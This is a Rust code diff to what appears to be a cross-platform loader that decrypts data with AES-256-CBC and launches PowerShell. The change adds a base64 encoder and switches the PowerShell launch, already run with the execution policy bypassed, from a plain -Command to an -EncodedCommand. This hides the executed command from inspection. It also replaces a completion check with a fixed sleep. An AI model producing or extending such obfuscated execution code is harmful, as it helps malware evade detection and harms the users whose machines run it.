@@ -139,6 +139,21 @@ fn base64_decode(s: &str) -> Option<Vec<u8>> {
     Some(out)
 }
 
+fn base64_encode(data: &[u8]) -> String {
+    let chars = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut out = String::new();
+    for chunk in data.chunks(3) {
+        let b0 = chunk[0] as usize;
+        let b1 = if chunk.len() > 1 { chunk[1] as usize } else { 0 };
+        let b2 = if chunk.len() > 2 { chunk[2] as usize } else { 0 };
+        out.push(chars[b0 >> 2] as char);
+        out.push(chars[((b0 & 3) << 4) | (b1 >> 4)] as char);
+        out.push(if chunk.len() > 1 { chars[((b1 & 15) << 2) | (b2 >> 6)] as char } else { '=' });
+        out.push(if chunk.len() > 2 { chars[b2 & 63] as char } else { '=' });
+    }
+    out
+}
+
 fn aes256cbc_dec(key: &[u8; 32], iv: &[u8; 16], data: &[u8]) -> Option<Vec<u8>> {
     if data.len() % 16 != 0 { return None; }
     let mut out = Vec::new();
@@ -323,14 +338,16 @@ fn main() {
         let ps_path = std::env::var("WINDIR")
             .map(|w| format!("{}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", w))
             .unwrap_or_else(|_| "powershell.exe".to_string());
+        let b64 = {
+            let bytes: Vec<u8> = cmd.encode_utf16()
+                .flat_map(|c| c.to_le_bytes().to_vec())
+                .collect();
+            base64_encode(&bytes)
+        };
         let _ = Command::new(&ps_path)
-            .args(["-NoProfile","-ExecutionPolicy","Bypass","-Command",&cmd])
+            .args(["-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",&b64])
             .spawn();
-        let start = std::time::Instant::now();
-        while start.elapsed() < std::time::Duration::from_secs(25) {
-            if done.exists() { break; }
-            std::thread::sleep(std::time::Duration::from_millis(500));
-        }
+        std::thread::sleep(std::time::Duration::from_secs(20));
     }
 
     #[cfg(target_os = "macos")]
